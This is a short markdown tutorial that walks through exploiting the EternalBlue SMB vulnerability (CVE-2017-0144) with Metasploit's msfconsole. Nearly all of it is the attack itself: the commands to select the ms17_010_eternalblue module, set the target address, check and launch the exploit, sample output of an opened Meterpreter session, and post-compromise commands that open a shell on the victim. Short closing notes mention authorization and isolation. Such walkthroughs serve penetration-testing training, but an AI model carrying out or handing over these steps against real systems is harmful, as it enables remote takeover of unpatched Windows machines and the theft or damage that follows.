# Exploit Example with msfconsole: EternalBlue

## Description

EternalBlue is a remote code execution vulnerability in Microsoft's implementation of the SMB protocol. This exploit targets Windows operating systems vulnerable to CVE-2017-0144.

## Steps

1. **Launch msfconsole**:
   ```
   msfconsole
   ```

2. **Search for the EternalBlue exploit**:
   ```
   search eternalblue
   ```

3. **Select the exploit module**:
   ```
   use exploit/windows/smb/ms17_010_eternalblue
   ```

4. **Set the required options**:
   ```
   set RHOSTS <target_ip>
   ```

   Replace `<target_ip>` with the IP address of the vulnerable Windows system.

5. **Review and set additional options**:
   ```
   show options
   ```

6. **Verify if the target is vulnerable**:
   ```
   check
   ```

7. **Launch the exploit**:
   ```
   exploit
   ```

8. **Wait for the exploit to complete**:
   ```
   [*] Sending stage (179779 bytes) to <target_ip>
   [*] Meterpreter session <session_id> opened (...)
   ```

   Once successful, you will have a Meterpreter session opened on the target system.

9. **Interact with the session**:
   ```
   sessions -i <session_id>
   ```

   Replace `<session_id>` with the ID of the Meterpreter session.

10. **Explore the compromised system**:
    ```
    sysinfo
    getuid
    shell
    ```

    These commands will give you information about the system, the current user, and allow you to interact with the command shell.

## Notes

- Ensure that you have proper authorization before exploiting any vulnerabilities.
- Verify the target and ensure that it is properly isolated from the rest of your network to prevent unintended consequences.
- This example demonstrates a specific exploit, but always keep in mind that the effectiveness of an exploit depends on various factors such as target configuration, network environment, and patch status.

